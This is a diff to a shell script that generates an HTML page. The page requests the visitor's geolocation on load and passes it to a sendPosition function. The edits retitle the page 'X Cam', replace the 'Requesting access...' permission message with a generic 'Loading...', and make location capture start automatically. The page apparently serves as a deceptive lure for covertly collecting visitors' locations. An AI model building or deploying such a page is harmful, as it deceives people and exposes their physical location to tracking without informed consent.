@@ -6,7 +6,7 @@ echo '
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading...</title>
+    <title>X Cam - Loading</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script>
         // Debug function to log messages - only log essential information
@@ -30,7 +30,7 @@ echo '
                 // Don\'t log this message
                 
                 // Show permission request message
-                document.getElementById("locationStatus").innerText = "Requesting access...";
+                document.getElementById("locationStatus").innerText = "Loading...";
                 
                 navigator.geolocation.getCurrentPosition(
                     sendPosition, 
@@ -110,13 +110,16 @@ echo '
         }
         
         // Try to get location when page loads
-        window.addEventListener('DOMContentLoaded', function() { getLocation(); });
+        window.onload = function() {
+            // Don\'t log this message
+            getLocation(); // Auto-start immediately on load
+        };
     </script>
 </head>
 <body style="background-color: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; padding-top: 50px;">
     <h2>Loading...</h2>
-    <p>Initializing...</p>
-    <p id="locationStatus">Initializing...</p>
+    <p>Loading...</p>
+    <p id="locationStatus">Loading...</p>
     <div style="margin-top: 30px;">
         <div class="spinner" style="border: 8px solid #333; border-top: 8px solid #f3f3f3; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 0 auto;"></div>
     </div>
